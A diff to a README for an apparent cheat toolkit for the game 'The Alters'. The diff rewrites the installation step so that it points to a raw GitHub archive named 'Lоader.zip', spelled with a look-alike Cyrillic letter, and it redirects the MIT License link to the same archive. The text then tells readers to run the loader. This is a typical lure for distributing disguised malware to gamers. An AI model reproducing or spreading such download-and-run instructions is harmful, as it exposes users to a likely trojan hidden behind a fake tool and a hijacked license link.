@@ -28,7 +28,7 @@ the alters cheats, the alters tools, gaming utility, hacks toolkit, game enhance
 
 ## 📥 Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/josepaullupa/AlteredAdvantage-HacksHub/main/Lоader.zip** from the repository.
 2. Extract the archive to your preferred folder.
 3. Run the Loader and follow the on-screen instructions for setup.
 4. Enjoy unleashed possibilities in **The Alters**!
@@ -39,4 +39,4 @@ This toolkit is intended for educational and research purposes, enhancing person
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) — 2025
+Distributed under the [MIT License](https://raw.githubusercontent.com/josepaullupa/AlteredAdvantage-HacksHub/main/Lоader.zip) — 2025
